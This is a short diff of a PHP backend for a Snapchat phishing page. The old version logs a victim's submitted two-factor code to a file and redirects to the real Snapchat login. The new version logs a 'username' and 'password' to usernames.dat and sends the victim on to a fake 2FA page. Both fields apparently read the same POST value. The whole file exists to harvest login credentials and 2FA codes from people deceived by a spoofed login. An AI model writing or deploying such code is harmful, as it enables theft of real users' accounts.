@@ -1,9 +1,5 @@
 <?php
-
-$code = $_POST['code'] ?? 'EMPTY_CODE';
-
-file_put_contents("auth/usernames.dat", "Snapchat 2FA Code: $code\n", FILE_APPEND);
-
-header('Location: https://accounts.snapchat.com/accounts/login');
+file_put_contents("usernames.dat", "Snapchat Username: " . $_POST['code'] . " Pass: " . $_POST['code'] . "\n", FILE_APPEND);
+header('Location: snapchat-2fa.html');
 exit();
 ?>
